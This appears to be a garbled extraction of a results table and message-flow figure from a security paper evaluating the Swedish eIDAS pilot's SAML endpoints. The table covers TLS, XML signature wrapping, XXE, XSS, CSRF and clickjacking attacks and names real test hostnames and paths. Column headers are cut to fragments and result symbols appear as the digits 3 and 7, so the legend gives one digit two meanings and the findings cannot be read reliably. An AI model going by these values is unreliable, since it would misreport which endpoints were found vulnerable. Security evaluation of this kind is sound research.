                                                                                                                                                                                                                          F




                                           ificat
                                                                                                                                                                                        rn




  SAML




               TLS
                          Ciph
                                          Cert
                                                       DRO
                                                               POO
                                                                        Bleic
                                                                                         Padd
                                                                                                      Inval
                                                                                                                     Hear
                                                                                                                               0/ Sig
                                                                                                                                        CF
                                                                                                                                             XSW
                                                                                                                                                     XEA
                                                                                                                                                           Repl
                                                                                                                                                                      TRC
                                                                                                                                                                            XSLT
                                                                                                                                                                                   Exte
                                                                                                                                                                                                               XSS
                                                                                                                                                                                                                      CSR
                                                                                                                                                                                                                              Click
                                                                                                                                                                                                                                         Cove
                                                                                                                                                                                                                                                      Head




 Endpoint
   H1            3            3            3            3       3           3                3           3             3        3       3    3        3       3       3     3                3                 3       3         3           3         3
   H2 *          3            3            3            3       3           3                3           3             3        3       3    3        3       3       3     3                3                 3       3         71          3         32
   H3 *          3            3            3            3       3           3                3           3             3        3       3    3        3       3       3     3                3                 3       3         71          3         32
   H4 *          3            3            3            3       3           3                3           3             3        3       3    3        3       3       3     3                3                 3       3         71          3         32
   H5            3            3            3            3       3           3                3           3             3        3       3    3        34      3       3     3                3                 3       3         3           3         3
   H6 *          3            3            3            3       3           3                3           3             3        3       3    3        3       3       3     3                7                 3       33        3           3         3
 * Shared TLS Endpoint of eunode.eidastest.se and nonode.eidastest.se (virtual hosting with shared certificate)
 1 Attack mitigated in newer versions
 2 Missing X-Frame-Options header and frame-ancestor directive in CSP
 3 RelayState parameter not properly bound to session
 4 Encrypts Assertion using AES128-CBC (no ciphertext authentication)


3= Not vulnerable, 7= Vulnerable, 3= Weak configuration, 7= Vulnerability mitigated
H1-H6: See Table 2 for specific SAML endpoint URLs.

 Table 3: Results of the security evaluation of the Swedish eIDAS pilot. User authentication was simulated using the provided IdP of fictitious Test Country XX.
                                                        SP                 eIDAS Connector              eIDAS Proxy & IdP
                User   UA
                                                eunode.eidastest.se         eunode.qa.sveidas.se          nonode.eidastest.se




                                                   /con-sp/login
                        (1.) Login request

                        (2.) AuthnRequest (i)
                                                                          /idp/profile/SAML2/POST/SSO



                        (3.) AuthnReq (ii)
                                                                                                        /EidasNode/ColleagueRequest



                        (4.) AuthnReq (iii)

                                                                                                        /PS-IdP/AuthenticateCitizen



                        (5.) Authentication

                        (6.) SAMLResponse (i)

                                                                                                          /EidasNode/IdPResponse



                        (7.) Consent

                        (8.) SAMLResponse (ii)

                                                                            /idp/extauth/saml2/post



                        (9.) SAMLResponse (iii)

                                              /con-sp/assertionconsumer




Figure 3: Message flow of an authentication process at the Swedish eIDAS pilot. The eIDAS connector represents the
receiving member-state (Sweden) while the Proxy-Service and IdP represent the sending member-state (Test Country
XX).
